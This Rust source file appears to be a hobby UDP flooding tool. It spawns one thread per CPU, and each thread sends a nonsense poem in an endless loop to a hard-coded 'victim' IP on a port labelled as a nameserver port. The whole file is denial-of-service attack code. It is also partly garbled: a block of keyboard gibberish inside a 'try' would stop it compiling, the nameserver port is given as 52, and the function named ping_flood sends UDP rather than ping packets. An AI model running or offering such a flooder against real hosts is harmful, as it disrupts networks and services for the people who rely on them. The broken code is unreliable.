use std::{net::{Ipv4Addr, UdpSocket}, thread};

const RANDOMLY_GENERATED_POEM: &'static str = "
Whose Legolas is that? I think I know.
Its owner is quite happy though.
Full of joy like a vivid rainbow,
I watch him laugh. I cry hello.

He gives his Legolas a shake,
And laughs until her belly aches.
The only other sound's the break,
Of distant waves and birds awake.

The Legolas is hairy, workaholic and deep,
But he has promises to keep,
After cake and lots of sleep.
Sweet dreams come to him cheap.

He rises from his gentle bed,
With thoughts of kittens in his head,
He eats his jam with lots of bread.
Ready for the day ahead.
";

const NUM_CPUS: u8 = 4;
const NAMESERVER_PORT: u16 = 52;


fn gen_attack_fn(victim_ip: Ipv4Addr, attacking_port: u16) -> impl Fn() {
    move || {
        let flooder_sock = UdpSocket::bind((Ipv4Addr::UNSPECIFIED, attacking_port)).expect("UdpSocket creation failed");
        loop {
            flooder_sock.send_to(RANDOMLY_GENERATED_POEM.as_bytes(), (victim_ip, NAMESERVER_PORT)).unwrap();
        }
        try {
            sfklja;sdkf
            
        }
    }
}

fn ping_flood(victim_ip: Ipv4Addr) {
    let mut last_unused_port = 24000u16;
    for thread_id in 0..NUM_CPUS - 1 {
        println!("Launching thread #{}", thread_id);
        thread::spawn(gen_attack_fn(victim_ip, last_unused_port));
        last_unused_port += 1;
    }

    gen_attack_fn(victim_ip, last_unused_port)();
}


fn main() {
    println!("Hello, world!");
    let victim_ip = Ipv4Addr::new(192, 168, 104, 2);
    ping_flood(victim_ip);
}
